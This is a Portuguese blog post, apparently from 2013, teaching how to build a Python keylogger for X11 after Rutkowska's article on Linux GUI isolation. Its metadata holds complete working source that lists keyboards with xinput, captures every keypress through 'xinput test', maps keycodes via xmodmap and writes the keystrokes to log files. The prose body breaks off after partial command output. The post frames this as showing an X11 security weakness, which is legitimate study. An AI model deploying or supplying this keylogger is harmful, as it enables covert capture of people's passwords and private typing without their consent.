---
id: 1982
title: Como Fazer um Keylogger para o X11
date: 2013-04-01T09:20:26+00:00
author: CKPYT
excerpt: Nesse post aprendemos como fazer um keylogger em python para guardar as teclas digitadas no X11.
layout: post
guid: http://www.sawp.com.br/blog/?p=1982
permalink: p=1982
wp-syntax-cache-content:
  - |
    a:9:{i:1;s:1510:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="sh" style="font-family:monospace;">pedro@HAL9001:~$ xinput list
    ⎡ Virtual core pointer                    	id=2	[master pointer  (3)]
    ⎜   ↳ Virtual core XTEST pointer              	id=4	[slave  pointer  (2)]
    ⎜   ↳ MosArt Optical Mouse                    	id=9	[slave  pointer  (2)]
    ⎣ Virtual core keyboard                   	id=3	[master keyboard (2)]
    ↳ Virtual core XTEST keyboard             	id=5	[slave  keyboard (3)]
    ↳ Power Button                            	id=6	[slave  keyboard (3)]
    ↳ Power Button                            	id=7	[slave  keyboard (3)]
    ↳ Hewlett-Packard Company HP USB CCID Smartcard Keyboard	id=8	[slave  keyboard (3)]</pre></td></tr></table><p class="theCode" style="display:none;">pedro@HAL9001:~$ xinput list
    ⎡ Virtual core pointer                    	id=2	[master pointer  (3)]
    ⎜   ↳ Virtual core XTEST pointer              	id=4	[slave  pointer  (2)]
    ⎜   ↳ MosArt Optical Mouse                    	id=9	[slave  pointer  (2)]
    ⎣ Virtual core keyboard                   	id=3	[master keyboard (2)]
    ↳ Virtual core XTEST keyboard             	id=5	[slave  keyboard (3)]
    ↳ Power Button                            	id=6	[slave  keyboard (3)]
    ↳ Power Button                            	id=7	[slave  keyboard (3)]
    ↳ Hewlett-Packard Company HP USB CCID Smartcard Keyboard	id=8	[slave  keyboard (3)]</p></div>
    ;i:2;s:644:
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="sh" style="font-family:monospace;">pedro@HAL9001:~$ xinput test 8
    key release 36
    key press   28
    tkey release 28
    key press   26
    ekey release 26
    key press   39
    skey release 39
    key press   28
    tkey release 28
    key press   26
    ekey release 26</pre></td></tr></table><p class="theCode" style="display:none;">pedro@HAL9001:~$ xinput test 8
    key release 36
    key press   28
    tkey release 28
    key press   26
    ekey release 26
    key press   39
    skey release 39
    key press   28
    tkey release 28
    key press   26
    ekey release 26</p></div>
    ;i:3;s:1378:
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="python" style="font-family:monospace;">KEYPRESS_REGEX <span style="color: #66cc66;">=</span> <span style="color: #dc143c;">re</span>.<span style="color: #008000;">compile</span><span style="color: black;">&#40;</span>r<span style="color: #483d8b;">'key press +(<span style="color: #000099; font-weight: bold;">\d</span>+)'</span><span style="color: black;">&#41;</span>
    KEYBOARD_REGEX <span style="color: #66cc66;">=</span> <span style="color: #dc143c;">re</span>.<span style="color: #008000;">compile</span><span style="color: black;">&#40;</span>r<span style="color: #483d8b;">'(.*)Keyboard(.*)id=(<span style="color: #000099; font-weight: bold;">\d</span>+)(.*)'</span><span style="color: black;">&#41;</span>
    KEYCODE_REGEX <span style="color: #66cc66;">=</span> <span style="color: #dc143c;">re</span>.<span style="color: #008000;">compile</span><span style="color: black;">&#40;</span>r<span style="color: #483d8b;">'keycode +(<span style="color: #000099; font-weight: bold;">\d</span>+) = (.+)'</span><span style="color: black;">&#41;</span></pre></td></tr></table><p class="theCode" style="display:none;">KEYPRESS_REGEX = re.compile(r'key press +(\d+)')
    KEYBOARD_REGEX = re.compile(r'(.*)Keyboard(.*)id=(\d+)(.*)')
    KEYCODE_REGEX = re.compile(r'keycode +(\d+) = (.+)')</p></div>
    ;i:4;s:2368:
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="python" style="font-family:monospace;"><span style="color: #ff7700;font-weight:bold;">def</span> get_listanables_keyboards<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>:
    stdout <span style="color: #66cc66;">=</span> bash.<span style="color: black;">xinput</span><span style="color: black;">&#40;</span><span style="color: #483d8b;">&quot;list&quot;</span><span style="color: black;">&#41;</span>
    keyboards <span style="color: #66cc66;">=</span> <span style="color: black;">&#91;</span><span style="color: black;">&#93;</span>
    <span style="color: #ff7700;font-weight:bold;">for</span> line <span style="color: #ff7700;font-weight:bold;">in</span> stdout:
    match <span style="color: #66cc66;">=</span> KEYBOARD_REGEX.<span style="color: black;">match</span><span style="color: black;">&#40;</span>line<span style="color: black;">&#41;</span>
    <span style="color: #ff7700;font-weight:bold;">if</span> match <span style="color: #ff7700;font-weight:bold;">and</span> match.<span style="color: black;">group</span><span style="color: black;">&#40;</span><span style="color: #ff4500;">3</span><span style="color: black;">&#41;</span>.<span style="color: black;">isdigit</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>:
    keyboard <span style="color: #66cc66;">=</span> <span style="color: #008000;">int</span><span style="color: black;">&#40;</span>match.<span style="color: black;">group</span><span style="color: black;">&#40;</span><span style="color: #ff4500;">3</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>
    keyboards.<span style="color: black;">append</span><span style="color: black;">&#40;</span>keyboard<span style="color: black;">&#41;</span>
    <span style="color: #ff7700;font-weight:bold;">return</span> keyboards</pre></td></tr></table><p class="theCode" style="display:none;">def get_listanables_keyboards():
    stdout = bash.xinput(&quot;list&quot;)
    keyboards = []
    for line in stdout:
    match = KEYBOARD_REGEX.match(line)
    if match and match.group(3).isdigit():
    keyboard = int(match.group(3))
    keyboards.append(keyboard)
    return keyboards</p></div>
    ;i:5;s:1156:
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="python" style="font-family:monospace;"><span style="color: #ff7700;font-weight:bold;">if</span> __name__ <span style="color: #66cc66;">==</span> <span style="color: #483d8b;">'__main__'</span>:
    keyboards <span style="color: #66cc66;">=</span> get_listanables_keyboards<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
    <span style="color: #ff7700;font-weight:bold;">for</span> keyboard <span style="color: #ff7700;font-weight:bold;">in</span> keyboards:
    Keylogger<span style="color: black;">&#40;</span>keyboard<span style="color: black;">&#41;</span>.<span style="color: black;">start</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
    signal_listener<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span></pre></td></tr></table><p class="theCode" style="display:none;">if __name__ == '__main__':
    keyboards = get_listanables_keyboards()
    for keyboard in keyboards:
    Keylogger(keyboard).start()
    signal_listener()</p></div>
    ;i:6;s:1504:
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="python" style="font-family:monospace;"><span style="color: #ff7700;font-weight:bold;">def</span> signal_listener<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>:
    <span style="color: #ff7700;font-weight:bold;">for</span> sig <span style="color: #ff7700;font-weight:bold;">in</span> <span style="color: #008000;">range</span><span style="color: black;">&#40;</span><span style="color: #ff4500;">1</span><span style="color: #66cc66;">,</span> <span style="color: #dc143c;">signal</span>.<span style="color: black;">NSIG</span><span style="color: black;">&#41;</span>:
    <span style="color: #ff7700;font-weight:bold;">try</span>:
    <span style="color: #dc143c;">signal</span>.<span style="color: #dc143c;">signal</span><span style="color: black;">&#40;</span>sig<span style="color: #66cc66;">,</span> <span style="color: #dc143c;">signal</span>.<span style="color: black;">SIG_DFL</span><span style="color: black;">&#41;</span>
    <span style="color: #ff7700;font-weight:bold;">except</span> <span style="color: #008000;">RuntimeError</span>:
    <span style="color: #ff7700;font-weight:bold;">pass</span></pre></td></tr></table><p class="theCode" style="display:none;">def signal_listener():
    for sig in range(1, signal.NSIG):
    try:
    signal.signal(sig, signal.SIG_DFL)
    except RuntimeError:
    pass</p></div>
    ;i:7;s:3315:
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="python" style="font-family:monospace;"><span style="color: #ff7700;font-weight:bold;">class</span> Keylogger<span style="color: black;">&#40;</span>Thread<span style="color: black;">&#41;</span>:
    <span style="color: #483d8b;">&quot;&quot;&quot;Keylogger for a single keyboard&quot;&quot;&quot;</span>
    <span style="color: #ff7700;font-weight:bold;">def</span> <span style="color: #0000cd;">__init__</span><span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: #66cc66;">,</span> keyboard<span style="color: black;">&#41;</span>:
    Thread.<span style="color: #0000cd;">__init__</span><span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: black;">&#41;</span>
    <span style="color: #008000;">self</span>._keyboard <span style="color: #66cc66;">=</span> keyboard
    <span style="color: #008000;">self</span>._filename <span style="color: #66cc66;">=</span> <span style="color: #483d8b;">'keyboard%d.log'</span> % <span style="color: #008000;">self</span>._keyboard
    <span style="color: #008000;">self</span>._file <span style="color: #66cc66;">=</span> <span style="color: #008000;">open</span><span style="color: black;">&#40;</span><span style="color: #008000;">self</span>._filename<span style="color: #66cc66;">,</span> <span style="color: #483d8b;">'w+'</span><span style="color: black;">&#41;</span>
    <span style="color: #008000;">self</span>.__define_constants<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
    &nbsp;
    <span style="color: #ff7700;font-weight:bold;">def</span> <span style="color: #0000cd;">__del__</span><span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: black;">&#41;</span>:
    <span style="color: #008000;">self</span>.__exit__<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
    &nbsp;
    <span style="color: #ff7700;font-weight:bold;">def</span> __exit__<span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: black;">&#41;</span>:
    <span style="color: #008000;">self</span>._file.<span style="color: black;">close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
    &nbsp;
    <span style="color: #ff7700;font-weight:bold;">def</span> run<span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: black;">&#41;</span>:
    <span style="color: #008000;">self</span>._log<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span></pre></td></tr></table><p class="theCode" style="display:none;">class Keylogger(Thread):
    &quot;&quot;&quot;Keylogger for a single keyboard&quot;&quot;&quot;
    def __init__(self, keyboard):
    Thread.__init__(self)
    self._keyboard = keyboard
    self._filename = 'keyboard%d.log' % self._keyboard
    self._file = open(self._filename, 'w+')
    self.__define_constants()
    
    def __del__(self):
    self.__exit__()
    
    def __exit__(self):
    self._file.close()
    
    def run(self):
    self._log()</p></div>
    ;i:8;s:2936:
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="python" style="font-family:monospace;">    <span style="color: #ff7700;font-weight:bold;">def</span> _log<span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: black;">&#41;</span>:
    logger <span style="color: #66cc66;">=</span> bash.<span style="color: black;">xinput</span><span style="color: black;">&#40;</span><span style="color: #483d8b;">&quot;test&quot;</span><span style="color: #66cc66;">,</span> <span style="color: #008000;">self</span>._keyboard<span style="color: #66cc66;">,</span> _iter<span style="color: #66cc66;">=</span><span style="color: #008000;">True</span><span style="color: black;">&#41;</span>
    keymap <span style="color: #66cc66;">=</span> <span style="color: #008000;">self</span>._get_keymap<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
    <span style="color: #ff7700;font-weight:bold;">try</span>:
    <span style="color: #ff7700;font-weight:bold;">for</span> line <span style="color: #ff7700;font-weight:bold;">in</span> logger:
    match <span style="color: #66cc66;">=</span> KEYPRESS_REGEX.<span style="color: black;">match</span><span style="color: black;">&#40;</span>line<span style="color: black;">&#41;</span>
    <span style="color: #ff7700;font-weight:bold;">if</span> match:
    keycode <span style="color: #66cc66;">=</span> match.<span style="color: black;">groups</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#91;</span><span style="color: #ff4500;">0</span><span style="color: black;">&#93;</span>
    key <span style="color: #66cc66;">=</span> keymap<span style="color: black;">&#91;</span>keycode<span style="color: black;">&#93;</span>
    <span style="color: #008000;">self</span>._writen_file<span style="color: black;">&#40;</span>key<span style="color: black;">&#41;</span>
    <span style="color: #ff7700;font-weight:bold;">except</span> <span style="color: #008000;">Exception</span>:
    <span style="color: #ff7700;font-weight:bold;">print</span> <span style="color: #483d8b;">&quot;Salved into %s&quot;</span> % <span style="color: #008000;">self</span>._filename</pre></td></tr></table><p class="theCode" style="display:none;">    def _log(self):
    logger = bash.xinput(&quot;test&quot;, self._keyboard, _iter=True)
    keymap = self._get_keymap()
    try:
    for line in logger:
    match = KEYPRESS_REGEX.match(line)
    if match:
    keycode = match.groups()[0]
    key = keymap[keycode]
    self._writen_file(key)
    except Exception:
    print &quot;Salved into %s&quot; % self._filename</p></div>
    ;i:9;s:20088:
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="python" style="font-family:monospace;"><span style="color: #ff7700;font-weight:bold;">class</span> Keylogger<span style="color: black;">&#40;</span>Thread<span style="color: black;">&#41;</span>:
    <span style="color: #483d8b;">&quot;&quot;&quot;Keylogger for a single keyboard&quot;&quot;&quot;</span>
    <span style="color: #ff7700;font-weight:bold;">def</span> <span style="color: #0000cd;">__init__</span><span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: #66cc66;">,</span> keyboard<span style="color: black;">&#41;</span>:
    Thread.<span style="color: #0000cd;">__init__</span><span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: black;">&#41;</span>
    <span style="color: #008000;">self</span>._keyboard <span style="color: #66cc66;">=</span> keyboard
    <span style="color: #008000;">self</span>._filename <span style="color: #66cc66;">=</span> <span style="color: #483d8b;">'keyboard%d.log'</span> % <span style="color: #008000;">self</span>._keyboard
    <span style="color: #008000;">self</span>._file <span style="color: #66cc66;">=</span> <span style="color: #008000;">open</span><span style="color: black;">&#40;</span><span style="color: #008000;">self</span>._filename<span style="color: #66cc66;">,</span> <span style="color: #483d8b;">'w+'</span><span style="color: black;">&#41;</span>
    <span style="color: #008000;">self</span>.__define_constants<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
    &nbsp;
    <span style="color: #ff7700;font-weight:bold;">def</span> <span style="color: #0000cd;">__del__</span><span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: black;">&#41;</span>:
    <span style="color: #008000;">self</span>.__exit__<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
    &nbsp;
    <span style="color: #ff7700;font-weight:bold;">def</span> __exit__<span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: black;">&#41;</span>:
    <span style="color: #008000;">self</span>._file.<span style="color: black;">close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
    &nbsp;
    <span style="color: #ff7700;font-weight:bold;">def</span> run<span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: black;">&#41;</span>:
    <span style="color: #008000;">self</span>._log<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
    &nbsp;
    <span style="color: #ff7700;font-weight:bold;">def</span> __define_constants<span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: black;">&#41;</span>:
    <span style="color: #008000;">self</span>._special_chars <span style="color: #66cc66;">=</span> <span style="color: black;">&#123;</span>
    <span style="color: #483d8b;">'space'</span>: <span style="color: #483d8b;">' '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'apostrophe'</span>: <span style="color: #483d8b;">&quot;'&quot;</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'BackSpace'</span>: <span style="color: #483d8b;">' (Backspace) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Return'</span>: <span style="color: #483d8b;">' <span style="color: #000099; font-weight: bold;">\n</span>'</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'period'</span>: <span style="color: #483d8b;">'.'</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Shift_L1'</span>: <span style="color: #483d8b;">' (Shift1) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Shift_L2'</span>: <span style="color: #483d8b;">' (Shift2) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Control_L'</span>: <span style="color: #483d8b;">' (ControlL) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'ccedilla'</span>: <span style="color: #483d8b;">'ç'</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'backslash'</span>: <span style="color: #483d8b;">'<span style="color: #000099; font-weight: bold;">\\</span>'</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'dead_tilde'</span>: <span style="color: #483d8b;">'~'</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Shift_L'</span>: <span style="color: #483d8b;">' (ShiftL) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Shift_R'</span>: <span style="color: #483d8b;">' (ShiftR) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'minus'</span>: <span style="color: #483d8b;">'-'</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'equal'</span>: <span style="color: #483d8b;">'='</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Alt_L'</span>: <span style="color: #483d8b;">' (AltL) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Escape'</span>: <span style="color: #483d8b;">' (esc) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'F1'</span>: <span style="color: #483d8b;">' (F1) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'F2'</span>: <span style="color: #483d8b;">' (F2) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'F3'</span>: <span style="color: #483d8b;">' (F3) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'F4'</span>: <span style="color: #483d8b;">' (F4) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'F5'</span>: <span style="color: #483d8b;">' (F5) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'F6'</span>: <span style="color: #483d8b;">' (F6) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'F7'</span>: <span style="color: #483d8b;">' (F7) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'F8'</span>: <span style="color: #483d8b;">' (F8) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'F9'</span>: <span style="color: #483d8b;">' (F9) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'F10'</span>: <span style="color: #483d8b;">' (F10) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'F11'</span>: <span style="color: #483d8b;">' (F11) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'F12'</span>: <span style="color: #483d8b;">' (F12) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Num_Lock'</span>: <span style="color: #483d8b;">' (NumLock) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'slash'</span>: <span style="color: #483d8b;">'/'</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'bracketright'</span>: <span style="color: #483d8b;">']'</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'bracketleft'</span>: <span style="color: #483d8b;">'['</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'comma'</span>: <span style="color: #483d8b;">','</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'semicolon'</span>: <span style="color: #483d8b;">';'</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Scroll_Lock'</span>: <span style="color: #483d8b;">' (ScrollLock) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Home'</span>: <span style="color: #483d8b;">' (Home) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'End'</span>: <span style="color: #483d8b;">' (End) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Prior'</span>: <span style="color: #483d8b;">' (PgUp) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Next'</span>: <span style="color: #483d8b;">' (PgDn) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Pause'</span>: <span style="color: #483d8b;">' (Pause) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Insert'</span>: <span style="color: #483d8b;">' (Insert) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Delete'</span>: <span style="color: #483d8b;">' (Del) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Print'</span>: <span style="color: #483d8b;">' (PrtScr) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Left'</span>: <span style="color: #483d8b;">' (Left) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Up'</span>: <span style="color: #483d8b;">' (Up) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Right'</span>: <span style="color: #483d8b;">' (Right) '</span><span style="color: #66cc66;">,</span>
    <span style="color: #483d8b;">'Down'</span>: <span style="color: #483d8b;">' (Down) '</span><span style="color: #66cc66;">,</span>
    <span style="color: black;">&#125;</span>
    &nbsp;
    <span style="color: #ff7700;font-weight:bold;">def</span> _log<span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: black;">&#41;</span>:
    logger <span style="color: #66cc66;">=</span> bash.<span style="color: black;">xinput</span><span style="color: black;">&#40;</span><span style="color: #483d8b;">&quot;test&quot;</span><span style="color: #66cc66;">,</span> <span style="color: #008000;">self</span>._keyboard<span style="color: #66cc66;">,</span> _iter<span style="color: #66cc66;">=</span><span style="color: #008000;">True</span><span style="color: black;">&#41;</span>
    keymap <span style="color: #66cc66;">=</span> <span style="color: #008000;">self</span>._get_keymap<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
    <span style="color: #ff7700;font-weight:bold;">try</span>:
    <span style="color: #ff7700;font-weight:bold;">for</span> line <span style="color: #ff7700;font-weight:bold;">in</span> logger:
    match <span style="color: #66cc66;">=</span> KEYPRESS_REGEX.<span style="color: black;">match</span><span style="color: black;">&#40;</span>line<span style="color: black;">&#41;</span>
    <span style="color: #ff7700;font-weight:bold;">if</span> match:
    keycode <span style="color: #66cc66;">=</span> match.<span style="color: black;">groups</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#91;</span><span style="color: #ff4500;">0</span><span style="color: black;">&#93;</span>
    key <span style="color: #66cc66;">=</span> keymap<span style="color: black;">&#91;</span>keycode<span style="color: black;">&#93;</span>
    <span style="color: #008000;">self</span>._writen_file<span style="color: black;">&#40;</span>key<span style="color: black;">&#41;</span>
    <span style="color: #ff7700;font-weight:bold;">except</span> <span style="color: #008000;">Exception</span>:
    <span style="color: #ff7700;font-weight:bold;">print</span> <span style="color: #483d8b;">&quot;Salved into %s&quot;</span> % <span style="color: #008000;">self</span>._filename
    &nbsp;
    <span style="color: #ff7700;font-weight:bold;">def</span> _writen_file<span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: #66cc66;">,</span> key<span style="color: black;">&#41;</span>:
    <span style="color: #008000;">self</span>._file.<span style="color: black;">write</span><span style="color: black;">&#40;</span>key<span style="color: black;">&#41;</span>
    <span style="color: #008000;">self</span>._file.<span style="color: black;">flush</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
    <span style="color: #dc143c;">os</span>.<span style="color: black;">fsync</span><span style="color: black;">&#40;</span><span style="color: #008000;">self</span>._file<span style="color: black;">&#41;</span>
    &nbsp;
    <span style="color: #ff7700;font-weight:bold;">def</span> _sanitize<span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: #66cc66;">,</span> key_char<span style="color: black;">&#41;</span>:
    <span style="color: #ff7700;font-weight:bold;">if</span> key_char <span style="color: #ff7700;font-weight:bold;">in</span> <span style="color: #008000;">self</span>._special_chars:
    <span style="color: #ff7700;font-weight:bold;">return</span> <span style="color: #008000;">self</span>._special_chars<span style="color: black;">&#91;</span>key_char<span style="color: black;">&#93;</span>
    <span style="color: #ff7700;font-weight:bold;">else</span>:
    <span style="color: #ff7700;font-weight:bold;">return</span> key_char
    &nbsp;
    <span style="color: #ff7700;font-weight:bold;">def</span> _get_keymap<span style="color: black;">&#40;</span><span style="color: #008000;">self</span><span style="color: black;">&#41;</span>:
    keymap <span style="color: #66cc66;">=</span> <span style="color: black;">&#123;</span><span style="color: black;">&#125;</span>
    table <span style="color: #66cc66;">=</span> bash.<span style="color: black;">xmodmap</span><span style="color: black;">&#40;</span><span style="color: #483d8b;">&quot;-pke&quot;</span><span style="color: black;">&#41;</span>
    <span style="color: #ff7700;font-weight:bold;">for</span> line <span style="color: #ff7700;font-weight:bold;">in</span> table:
    match <span style="color: #66cc66;">=</span> KEYCODE_REGEX.<span style="color: black;">match</span><span style="color: black;">&#40;</span>line<span style="color: black;">&#41;</span>
    <span style="color: #ff7700;font-weight:bold;">if</span> match <span style="color: #ff7700;font-weight:bold;">and</span> match.<span style="color: black;">groups</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#91;</span><span style="color: #ff4500;">1</span><span style="color: black;">&#93;</span>:
    keycode <span style="color: #66cc66;">=</span> match.<span style="color: black;">groups</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#91;</span><span style="color: #ff4500;">0</span><span style="color: black;">&#93;</span>
    key_chars_group <span style="color: #66cc66;">=</span> match.<span style="color: black;">groups</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#91;</span><span style="color: #ff4500;">1</span><span style="color: black;">&#93;</span>.<span style="color: black;">split</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>
    key_main_char <span style="color: #66cc66;">=</span> key_chars_group<span style="color: black;">&#91;</span><span style="color: #ff4500;">0</span><span style="color: black;">&#93;</span>
    keymap<span style="color: black;">&#91;</span>keycode<span style="color: black;">&#93;</span> <span style="color: #66cc66;">=</span> <span style="color: #008000;">self</span>._sanitize<span style="color: black;">&#40;</span>key_main_char<span style="color: black;">&#41;</span>
    <span style="color: #ff7700;font-weight:bold;">return</span> keymap</pre></td></tr></table><p class="theCode" style="display:none;">class Keylogger(Thread):
    &quot;&quot;&quot;Keylogger for a single keyboard&quot;&quot;&quot;
    def __init__(self, keyboard):
    Thread.__init__(self)
    self._keyboard = keyboard
    self._filename = 'keyboard%d.log' % self._keyboard
    self._file = open(self._filename, 'w+')
    self.__define_constants()
    
    def __del__(self):
    self.__exit__()
    
    def __exit__(self):
    self._file.close()
    
    def run(self):
    self._log()
    
    def __define_constants(self):
    self._special_chars = {
    'space': ' ',
    'apostrophe': &quot;'&quot;,
    'BackSpace': ' (Backspace) ',
    'Return': ' \n',
    'period': '.',
    'Shift_L1': ' (Shift1) ',
    'Shift_L2': ' (Shift2) ',
    'Control_L': ' (ControlL) ',
    'ccedilla': 'ç',
    'backslash': '\\',
    'dead_tilde': '~',
    'Shift_L': ' (ShiftL) ',
    'Shift_R': ' (ShiftR) ',
    'minus': '-',
    'equal': '=',
    'Alt_L': ' (AltL) ',
    'Escape': ' (esc) ',
    'F1': ' (F1) ',
    'F2': ' (F2) ',
    'F3': ' (F3) ',
    'F4': ' (F4) ',
    'F5': ' (F5) ',
    'F6': ' (F6) ',
    'F7': ' (F7) ',
    'F8': ' (F8) ',
    'F9': ' (F9) ',
    'F10': ' (F10) ',
    'F11': ' (F11) ',
    'F12': ' (F12) ',
    'Num_Lock': ' (NumLock) ',
    'slash': '/',
    'bracketright': ']',
    'bracketleft': '[',
    'comma': ',',
    'semicolon': ';',
    'Scroll_Lock': ' (ScrollLock) ',
    'Home': ' (Home) ',
    'End': ' (End) ',
    'Prior': ' (PgUp) ',
    'Next': ' (PgDn) ',
    'Pause': ' (Pause) ',
    'Insert': ' (Insert) ',
    'Delete': ' (Del) ',
    'Print': ' (PrtScr) ',
    'Left': ' (Left) ',
    'Up': ' (Up) ',
    'Right': ' (Right) ',
    'Down': ' (Down) ',
    }
    
    def _log(self):
    logger = bash.xinput(&quot;test&quot;, self._keyboard, _iter=True)
    keymap = self._get_keymap()
    try:
    for line in logger:
    match = KEYPRESS_REGEX.match(line)
    if match:
    keycode = match.groups()[0]
    key = keymap[keycode]
    self._writen_file(key)
    except Exception:
    print &quot;Salved into %s&quot; % self._filename
    
    def _writen_file(self, key):
    self._file.write(key)
    self._file.flush()
    os.fsync(self._file)
    
    def _sanitize(self, key_char):
    if key_char in self._special_chars:
    return self._special_chars[key_char]
    else:
    return key_char
    
    def _get_keymap(self):
    keymap = {}
    table = bash.xmodmap(&quot;-pke&quot;)
    for line in table:
    match = KEYCODE_REGEX.match(line)
    if match and match.groups()[1]:
    keycode = match.groups()[0]
    key_chars_group = match.groups()[1].split()
    key_main_char = key_chars_group[0]
    keymap[keycode] = self._sanitize(key_main_char)
    return keymap</p></div>
    ";}
categories:
  - Programming Internals
---
Esse post está atrasado uns dois anos. Ficamos de fazer esse keylogger desde que a Rutkowska publicou o post &#8220;<a href="http://theinvisiblethings.blogspot.com.br/2011/04/linux-security-circus-on-gui-isolation.html" target="_blank">The Linux Security Circus: On GUI isolation</a>&#8221; no dia 23 de abril de 2011 (este post foi escrito no dia 1 de abril de 2013). Segundo esse texto, podemos gravar os dados digitados pelo nosso usuário apenas utilizando comandos nativos do X11.

Para fazermos isso, primeiro verificamos como listar os dispositivos conectados e reconhecidos (utilizados) pelo ambiente gráfico:

<pre lang="sh">pedro@HAL9001:~$ xinput list
⎡ Virtual core pointer                    	id=2	[master pointer  (3)]
⎜   ↳ Virtual core XTEST pointer              	id=4	[slave  pointer  (2)]
⎜   ↳ MosArt Optical Mouse                    	id=9	[slave  pointer  (2)]
⎣ Virtual core keyboard                   	id=3	[master keyboard (2)]
    ↳ Virtual core XTEST keyboard             	id=5	[slave  keyboard (3)]
